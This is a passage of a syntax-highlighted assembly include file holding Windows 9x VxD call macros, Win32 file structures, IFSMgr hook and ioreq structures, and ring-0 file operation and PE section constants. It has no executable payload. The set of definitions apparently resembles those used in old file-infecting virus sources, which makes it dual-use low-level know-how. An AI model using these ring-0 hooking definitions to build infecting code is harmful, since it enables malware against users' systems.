</span><span class="sc5">MB_DEFBUTTON3</span><span class="sc0">       </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">200H</span><span class="sc0">
</span><span class="sc5">MB_APPLMODAL</span><span class="sc0">        </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">00H</span><span class="sc0">
</span><span class="sc5">MB_SYSTEMMODAL</span><span class="sc0">      </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">1000H</span><span class="sc0">
</span><span class="sc5">MB_NOFOCUS</span><span class="sc0">      </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">8000H</span><span class="sc0">
</span><span class="sc5">MB_ASAP</span><span class="sc0">         </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">80000000H</span><span class="sc0">
</span><span class="sc5">MB_NOWINDOW</span><span class="sc0">     </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">40000000H</span><span class="sc0">
</span><span class="sc5">MB_HANGSYS</span><span class="sc0">      </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">20000000H</span><span class="sc0">


</span><span class="sc5">VxdCall</span><span class="sc0"> </span><span class="sc9">macro</span><span class="sc0">   </span><span class="sc5">service_id</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">20h</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc5">service_id</span><span class="sc0">
</span><span class="sc9">endm</span><span class="sc0">

</span><span class="sc5">VxdJmp</span><span class="sc0">  </span><span class="sc9">macro</span><span class="sc0">   </span><span class="sc5">service_id</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">20h</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc5">service_id</span><span class="sc4">+</span><span class="sc2">8000h</span><span class="sc0">
</span><span class="sc9">endm</span><span class="sc0">

</span><span class="sc5">TRUE</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
</span><span class="sc5">FALSE</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc1">; parameters for SHELL_SYSMODAL_Message</span><span class="sc0">

</span><span class="sc5">MB_ABORTRETRYIGNORE</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">00000002h</span><span class="sc0">
</span><span class="sc5">MB_SYSTEMMODAL</span><span class="sc0">          </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">00001000h</span><span class="sc0">


</span><span class="sc1">;* Win32 Date Time structure</span><span class="sc0">
</span><span class="sc1">; This structure defines the new Win32 format structure for returning the</span><span class="sc0">
</span><span class="sc1">; date and time</span><span class="sc0">

</span><span class="sc5">FILETIME</span><span class="sc0">       </span><span class="sc9">struc</span><span class="sc0">
  </span><span class="sc5">dwLowDateTime</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
  </span><span class="sc5">dwHighDateTime</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0">     </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">FILETIME</span><span class="sc0">       </span><span class="sc9">ends</span><span class="sc0">

</span><span class="sc1">;* Win32 File Info By Handle Structure</span><span class="sc0">
</span><span class="sc1">;  This structure defines the contents of the result buffer on a</span><span class="sc0">
</span><span class="sc1">;  Win32 FileInfoByHandle. These calls are accessed by the new</span><span class="sc0">
</span><span class="sc1">;  LFN find apis</span><span class="sc0">

</span><span class="sc5">BY_HANDLE_FILE_INFORMATION</span><span class="sc0">     </span><span class="sc9">struc</span><span class="sc0">   </span><span class="sc1">; bhfi</span><span class="sc0">
  </span><span class="sc5">bhfi_dwFileAttributes</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
  </span><span class="sc5">bhfi_ftCreationTime</span><span class="sc0">           </span><span class="sc5">FILETIME</span><span class="sc0">    </span><span class="sc4">&lt;</span><span class="sc10">?</span><span class="sc4">&gt;</span><span class="sc0">
  </span><span class="sc5">bhfi_ftLastAccessTime</span><span class="sc0">         </span><span class="sc5">FILETIME</span><span class="sc0">    </span><span class="sc4">&lt;</span><span class="sc10">?</span><span class="sc4">&gt;</span><span class="sc0">
  </span><span class="sc5">bhfi_ftLastWriteTime</span><span class="sc0">          </span><span class="sc5">FILETIME</span><span class="sc0">    </span><span class="sc4">&lt;</span><span class="sc10">?</span><span class="sc4">&gt;</span><span class="sc0">
  </span><span class="sc5">bhfi_dwVolumeSerialNumber</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
  </span><span class="sc5">bhfi_nFileSizeHigh</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
  </span><span class="sc5">bhfi_nFileSizeLow</span><span class="sc0">             </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
  </span><span class="sc5">bhfi_nNumberOfLinks</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
  </span><span class="sc5">bhfi_nFileIndexHigh</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
  </span><span class="sc5">bhfi_nFileIndexLow</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">BY_HANDLE_FILE_INFORMATION</span><span class="sc0">     </span><span class="sc9">ends</span><span class="sc0">

</span><span class="sc1">;* Values for ir_flags for HM_FILETIMES:</span><span class="sc0">
</span><span class="sc5">GET_MODIFY_DATETIME</span><span class="sc0">     </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">0</span><span class="sc0">       </span><span class="sc1">; get last modification date/time</span><span class="sc0">
</span><span class="sc5">SET_MODIFY_DATETIME</span><span class="sc0">     </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">1</span><span class="sc0">       </span><span class="sc1">; set last modification date/time</span><span class="sc0">
</span><span class="sc5">GET_LAST_ACCESS_DATETIME</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0">    </span><span class="sc2">4</span><span class="sc0">       </span><span class="sc1">; get last access date/time</span><span class="sc0">
</span><span class="sc5">SET_LAST_ACCESS_DATETIME</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0">    </span><span class="sc2">5</span><span class="sc0">       </span><span class="sc1">; set last access date/time</span><span class="sc0">
</span><span class="sc5">GET_CREATION_DATETIME</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">6</span><span class="sc0">       </span><span class="sc1">; get creation date/time</span><span class="sc0">
</span><span class="sc5">SET_CREATION_DATETIME</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">7</span><span class="sc0">       </span><span class="sc1">; set creation date/time</span><span class="sc0">


</span><span class="sc1">;* Win32 Find Structure</span><span class="sc0">
</span><span class="sc1">;  This structure defines the contents of the result buffer on a</span><span class="sc0">
</span><span class="sc1">; Win32 FindFirst / FindNext. These calls are accessed by the new</span><span class="sc0">
</span><span class="sc1">; LFN find apis</span><span class="sc0">

</span><span class="sc5">WIN32_FIND_DATA</span><span class="sc0">        </span><span class="sc9">struc</span><span class="sc0">
  </span><span class="sc5">dwFileAttributes</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
  </span><span class="sc5">ftCreationTime</span><span class="sc0">        </span><span class="sc5">FILETIME</span><span class="sc0">    </span><span class="sc4">&lt;</span><span class="sc10">?</span><span class="sc4">&gt;</span><span class="sc0">
  </span><span class="sc5">ftLastAccessTime</span><span class="sc0">      </span><span class="sc5">FILETIME</span><span class="sc0">    </span><span class="sc4">&lt;</span><span class="sc10">?</span><span class="sc4">&gt;</span><span class="sc0">
  </span><span class="sc5">ftLastWriteTime</span><span class="sc0">       </span><span class="sc5">FILETIME</span><span class="sc0">    </span><span class="sc4">&lt;</span><span class="sc10">?</span><span class="sc4">&gt;</span><span class="sc0">
  </span><span class="sc5">nFileSizeHigh</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
  </span><span class="sc5">nFileSizeLow</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
  </span><span class="sc5">dwReserved0</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
  </span><span class="sc5">dwReserved1</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
  </span><span class="sc5">cFileName</span><span class="sc0">             </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">260</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">        </span><span class="sc1">; includes NUL</span><span class="sc0">
  </span><span class="sc5">cAlternateFileName</span><span class="sc0">    </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">14</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">              </span><span class="sc1">; includes NUL</span><span class="sc0">
</span><span class="sc5">WIN32_FIND_DATA</span><span class="sc0">        </span><span class="sc9">ends</span><span class="sc0">


</span><span class="sc5">IMAGE_SCN_MEM_EXECUTE</span><span class="sc0">       </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">20000000h</span><span class="sc0">
</span><span class="sc5">IMAGE_SCN_MEM_READ</span><span class="sc0">      </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">40000000h</span><span class="sc0">
</span><span class="sc5">IMAGE_SCN_MEM_WRITE</span><span class="sc0">     </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">80000000h</span><span class="sc0">
</span><span class="sc5">IMAGE_SCN_CNT_INITIALIZED_DATA</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">00000040h</span><span class="sc0">


</span><span class="sc5">ACCESS_MODE_MASK</span><span class="sc0">        </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">00007h</span><span class="sc0">  </span><span class="sc1">; Mask for access mode bits</span><span class="sc0">
</span><span class="sc5">ACCESS_READONLY</span><span class="sc0">         </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">00000h</span><span class="sc0">  </span><span class="sc1">; open for read-only access</span><span class="sc0">
</span><span class="sc5">ACCESS_WRITEONLY</span><span class="sc0">        </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">00001h</span><span class="sc0">  </span><span class="sc1">; open for write-only access</span><span class="sc0">
</span><span class="sc5">ACCESS_READWRITE</span><span class="sc0">        </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">00002h</span><span class="sc0">  </span><span class="sc1">; open for read and write access</span><span class="sc0">
</span><span class="sc5">ACCESS_EXECUTE</span><span class="sc0">          </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">00003h</span><span class="sc0">  </span><span class="sc1">; open for execute access</span><span class="sc0">

</span><span class="sc5">ACTION_MASK</span><span class="sc0">             </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">0ffh</span><span class="sc0">    </span><span class="sc1">; Open Actions Mask</span><span class="sc0">
</span><span class="sc5">ACTION_OPENEXISTING</span><span class="sc0">     </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">001h</span><span class="sc0">    </span><span class="sc1">; open an existing file</span><span class="sc0">
</span><span class="sc5">ACTION_REPLACEEXISTING</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">002h</span><span class="sc0">    </span><span class="sc1">; open existing file and set length</span><span class="sc0">
</span><span class="sc5">ACTION_CREATENEW</span><span class="sc0">        </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">010h</span><span class="sc0">    </span><span class="sc1">; create a new file, fail if exists</span><span class="sc0">
</span><span class="sc5">ACTION_OPENALWAYS</span><span class="sc0">       </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">011h</span><span class="sc0">    </span><span class="sc1">; open file, create if does not exist</span><span class="sc0">
</span><span class="sc5">ACTION_CREATEALWAYS</span><span class="sc0">     </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">012h</span><span class="sc0">    </span><span class="sc1">; create a new file, even if it exists</span><span class="sc0">

</span><span class="sc5">ioreq</span><span class="sc0">   </span><span class="sc9">struc</span><span class="sc0">
  </span><span class="sc5">ir_length</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">; length of user buffer</span><span class="sc0">
  </span><span class="sc5">ir_flags</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">; misc. status flags</span><span class="sc0">
  </span><span class="sc5">ir_user</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">; user ID for this request</span><span class="sc0">
  </span><span class="sc5">ir_sfn</span><span class="sc0">    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">; System File Number of file handle</span><span class="sc0">
  </span><span class="sc5">ir_pid</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">; process ID of requesting task</span><span class="sc0">
  </span><span class="sc5">ir_ppath</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">; unicode pathname</span><span class="sc0">
  </span><span class="sc5">ir_aux1</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">; secondary user data buffer</span><span class="sc0">
  </span><span class="sc5">ir_data</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">; ptr to user data buffer</span><span class="sc0">
  </span><span class="sc5">ir_options</span><span class="sc0">    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">; request handling options</span><span class="sc0">
  </span><span class="sc5">ir_error</span><span class="sc0">  </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">; error code (0 if OK)</span><span class="sc0">
  </span><span class="sc5">ir_rh</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">; resource handle</span><span class="sc0">
  </span><span class="sc5">ir_fh</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">; file (or find) handle</span><span class="sc0">
  </span><span class="sc5">ir_pos</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">; file position for request</span><span class="sc0">
  </span><span class="sc5">ir_aux2</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">; misc. extra API parameters</span><span class="sc0">
  </span><span class="sc5">ir_aux3</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">; misc. extra API parameters</span><span class="sc0">
  </span><span class="sc5">ir_pev</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">; ptr to IFSMgr event for async requests</span><span class="sc0">
  </span><span class="sc5">ir_fsd</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">16</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">  </span><span class="sc1">; Provider work space</span><span class="sc0">
</span><span class="sc5">ioreq</span><span class="sc0">   </span><span class="sc9">ends</span><span class="sc0">

</span><span class="sc5">ioreqsize</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc9">size</span><span class="sc0">    </span><span class="sc5">ioreq</span><span class="sc0">

</span><span class="sc5">hndlfunc</span><span class="sc0">        </span><span class="sc9">struc</span><span class="sc0">
    </span><span class="sc5">hf_read</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">; file read handler function</span><span class="sc0">
    </span><span class="sc5">hf_write</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">; file write handler function</span><span class="sc0">
    </span><span class="sc5">hf_misc</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">; ptr to misc. function vector</span><span class="sc0">
</span><span class="sc5">hndlfunc</span><span class="sc0">        </span><span class="sc9">ends</span><span class="sc0">

</span><span class="sc5">fhandle</span><span class="sc0"> </span><span class="sc9">struc</span><span class="sc0">
  </span><span class="sc5">fh_hf</span><span class="sc0">         </span><span class="sc5">hndlfunc</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
  </span><span class="sc5">fh_fh</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
  </span><span class="sc5">fh_psr</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
  </span><span class="sc5">fh_pSFT</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
  </span><span class="sc5">fh_position</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
  </span><span class="sc5">fh_devflags</span><span class="sc0">   </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
  </span><span class="sc5">fh_hflag</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
  </span><span class="sc5">fh_type</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
  </span><span class="sc5">fh_ref_count</span><span class="sc0">  </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
  </span><span class="sc5">fh_mode</span><span class="sc0">       </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
  </span><span class="sc5">fh_hlockinfo</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
  </span><span class="sc5">fh_prev</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
  </span><span class="sc5">fh_next</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
  </span><span class="sc5">fh_sfn</span><span class="sc0">        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
  </span><span class="sc5">fh_mmsfn</span><span class="sc0">      </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
  </span><span class="sc5">fh_pid</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
  </span><span class="sc5">fh_ntid</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
  </span><span class="sc5">fh_fhFlags</span><span class="sc0">    </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
  </span><span class="sc5">fh_InCloseCnt</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">fhandle</span><span class="sc0"> </span><span class="sc9">ends</span><span class="sc0">

</span><span class="sc5">hndlmisc</span><span class="sc0">        </span><span class="sc9">struc</span><span class="sc0">
  </span><span class="sc5">hm_version</span><span class="sc0">    </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">; IFS version #</span><span class="sc0">
  </span><span class="sc5">hm_revision</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">; IFS interface revision #</span><span class="sc0">
  </span><span class="sc5">hm_size</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">; # of entries in table</span><span class="sc0">
  </span><span class="sc5">hm_func</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">hndlmisc</span><span class="sc0">        </span><span class="sc9">ends</span><span class="sc0">

</span><span class="sc5">IFSMgr_hook_parameters</span><span class="sc0">      </span><span class="sc9">struc</span><span class="sc0">
</span><span class="sc5">FSDFnAddr</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">FunctionNum</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">Drive</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">ResourceFlags</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">CodePage</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">ptrToIOREQ</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">IFSMgr_hook_parameters</span><span class="sc0">      </span><span class="sc9">ends</span><span class="sc0">


</span><span class="sc5">IFSFN_READ</span><span class="sc0">          </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">0</span><span class="sc0">               </span><span class="sc1">; read a file</span><span class="sc0">
</span><span class="sc5">IFSFN_WRITE</span><span class="sc0">         </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">1</span><span class="sc0">               </span><span class="sc1">; write a file</span><span class="sc0">
</span><span class="sc5">IFSFN_FINDNEXT</span><span class="sc0">          </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">2</span><span class="sc0">               </span><span class="sc1">; LFN handle based Find Next</span><span class="sc0">
</span><span class="sc5">IFSFN_SEEK</span><span class="sc0">          </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">10</span><span class="sc0">              </span><span class="sc1">; Seek file handle</span><span class="sc0">
</span><span class="sc5">IFSFN_CLOSE</span><span class="sc0">         </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">11</span><span class="sc0">              </span><span class="sc1">; close handle</span><span class="sc0">
</span><span class="sc5">IFSFN_FILETIMES</span><span class="sc0">         </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">14</span><span class="sc0">              </span><span class="sc1">; get/set file modification time</span><span class="sc0">
</span><span class="sc5">IFSFN_HANDLEINFO</span><span class="sc0">        </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc0">              </span><span class="sc1">; get/set file information</span><span class="sc0">
</span><span class="sc5">IFSFN_ENUMHANDLE</span><span class="sc0">        </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">17</span><span class="sc0">              </span><span class="sc1">; enum file handle information</span><span class="sc0">
</span><span class="sc5">IFSFN_FINDCLOSE</span><span class="sc0">         </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">18</span><span class="sc0">              </span><span class="sc1">; LFN find close</span><span class="sc0">
</span><span class="sc5">IFSFN_DELETE</span><span class="sc0">            </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">31</span><span class="sc0">              </span><span class="sc1">; file delete</span><span class="sc0">
</span><span class="sc5">IFSFN_FILEATTRIB</span><span class="sc0">        </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">33</span><span class="sc0">              </span><span class="sc1">; DOS file attribute manipulation</span><span class="sc0">
</span><span class="sc5">IFSFN_OPEN</span><span class="sc0">          </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">36</span><span class="sc0">              </span><span class="sc1">; open file</span><span class="sc0">
</span><span class="sc5">IFSFN_RENAME</span><span class="sc0">            </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">37</span><span class="sc0">              </span><span class="sc1">; rename path</span><span class="sc0">
</span><span class="sc5">IFSFN_FINDOPEN</span><span class="sc0">          </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">44</span><span class="sc0">              </span><span class="sc1">; open  an LFN file search</span><span class="sc0">
</span><span class="sc5">IFSFN_SEARCH</span><span class="sc0">            </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">38</span><span class="sc0">

</span><span class="sc1">;* Values for ir_flags for HM_HANDLEINFO call:</span><span class="sc0">
</span><span class="sc5">HINFO_GET</span><span class="sc0">               </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">0</span><span class="sc0">       </span><span class="sc1">; retrieve current buffering info</span><span class="sc0">
</span><span class="sc5">HINFO_SETALL</span><span class="sc0">            </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">1</span><span class="sc0">       </span><span class="sc1">; set info (all parms)</span><span class="sc0">
</span><span class="sc5">HINFO_SETCHARTIME</span><span class="sc0">       </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">2</span><span class="sc0">       </span><span class="sc1">; set handle buffer timeout</span><span class="sc0">
</span><span class="sc5">HINFO_SETCHARCOUNT</span><span class="sc0">      </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">3</span><span class="sc0">       </span><span class="sc1">; set handle max buffer count</span><span class="sc0">

</span><span class="sc1">;* Values for ir_flags for HM_ENUMHANDLE call:</span><span class="sc0">
</span><span class="sc5">ENUMH_GETFILEINFO</span><span class="sc0">       </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">0</span><span class="sc0">       </span><span class="sc1">; get fileinfo by handle</span><span class="sc0">
</span><span class="sc5">ENUMH_GETFILENAME</span><span class="sc0">       </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">1</span><span class="sc0">       </span><span class="sc1">; get filename associated with handle</span><span class="sc0">
</span><span class="sc5">ENUMH_GETFINDINFO</span><span class="sc0">       </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">2</span><span class="sc0">       </span><span class="sc1">; get info for resuming</span><span class="sc0">
</span><span class="sc5">ENUMH_RESUMEFIND</span><span class="sc0">        </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">3</span><span class="sc0">       </span><span class="sc1">; resume find operation</span><span class="sc0">
</span><span class="sc5">ENUMH_RESYNCFILEDIR</span><span class="sc0">     </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">4</span><span class="sc0">       </span><span class="sc1">; resync dir entry info for file</span><span class="sc0">

</span><span class="sc1">;* Values for ir_flags for HM_SEEK:</span><span class="sc0">
</span><span class="sc5">FILE_BEGIN</span><span class="sc0">      </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">0</span><span class="sc0">               </span><span class="sc1">; absolute posn from file beginning</span><span class="sc0">
</span><span class="sc5">FILE_END</span><span class="sc0">        </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">2</span><span class="sc0">               </span><span class="sc1">; signed posn from file end</span><span class="sc0">

</span><span class="sc5">R0_FILEATTRIBUTES</span><span class="sc0">       </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">04300h</span><span class="sc0">      </span><span class="sc1">; Get/Set Attributes of a file</span><span class="sc0">
</span><span class="sc5">R0_OPENCREATFILE</span><span class="sc0">        </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">0D500h</span><span class="sc0">      </span><span class="sc1">; Open/Create a file</span><span class="sc0">
</span><span class="sc5">R0_READFILE</span><span class="sc0">         </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">0D600h</span><span class="sc0">      </span><span class="sc1">; Read a file, no context</span><span class="sc0">
</span><span class="sc5">R0_WRITEFILE</span><span class="sc0">            </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">0D601h</span><span class="sc0">      </span><span class="sc1">; Write to a file, no context</span><span class="sc0">
</span><span class="sc5">R0_CLOSEFILE</span><span class="sc0">            </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">0D700h</span><span class="sc0">      </span><span class="sc1">; Close a file</span><span class="sc0">
</span><span class="sc5">R0_GETFILESIZE</span><span class="sc0">          </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">0D800h</span><span class="sc0">      </span><span class="sc1">; Get size of a file</span><span class="sc0">
</span><span class="sc5">R0_FINDFIRSTFILE</span><span class="sc0">        </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">04E00h</span><span class="sc0">      </span><span class="sc1">; Do a LFN FindFirst operation</span><span class="sc0">
